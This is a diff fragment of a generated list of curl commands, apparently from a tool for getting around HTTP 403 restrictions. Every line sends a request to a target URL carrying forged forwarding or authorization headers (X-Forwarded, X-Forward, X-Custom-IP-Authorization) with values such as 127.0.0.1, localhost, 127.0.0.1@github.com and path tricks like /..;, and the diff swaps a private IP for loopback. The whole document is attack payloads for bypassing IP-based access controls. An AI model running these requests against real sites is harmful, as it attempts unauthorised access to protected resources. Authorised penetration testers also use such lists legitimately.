 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7009,22 +7009,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7035,7 +7035,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7049,8 +7049,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7072,34 +7072,34 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1 
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forward: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /.;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: /..;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: .;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ..;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: localhost;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: localhost:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7117,10 +7117,10 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authoriza
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://github.com:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://github.com:80..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://192.168.1.5:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://192.168.1.5:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://192.168.1.5:80..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1:80..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1@http://github.com:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1@http://github.com:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1@http://github.com:80..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7147,13 +7147,13 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authoriza
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1@github.com..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1.;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1..;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1#@http://github.com:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1#@http://github.com:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7168,7 +7168,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authoriza
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1#@github.com..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1 @http://github.com:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: http://127.0.0.1 @http://github.com:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7217,14 +7217,14 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authoriza
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: github.com.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: github.com..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5:80..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1:80..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1@http://github.com:80;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1@http://github.com:80.;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1@http://github.com:80..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -7306,40 +7306,40 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authoriza
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1 @github.com..;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Custom-IP-Authorization: ;' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
